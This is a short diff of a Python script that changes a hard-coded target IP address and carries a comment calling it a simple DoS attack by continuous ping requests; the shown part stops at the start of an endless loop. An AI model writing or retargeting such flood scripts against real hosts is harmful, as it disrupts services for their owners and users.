@@ -2,7 +2,7 @@
 import os
 import time
 
-target_ip = '192.168.140.118:6000'
+target_ip = '192.168.76.101:6000'
 
 # Simple DoS attack by sending continuous ping requests
 while True:
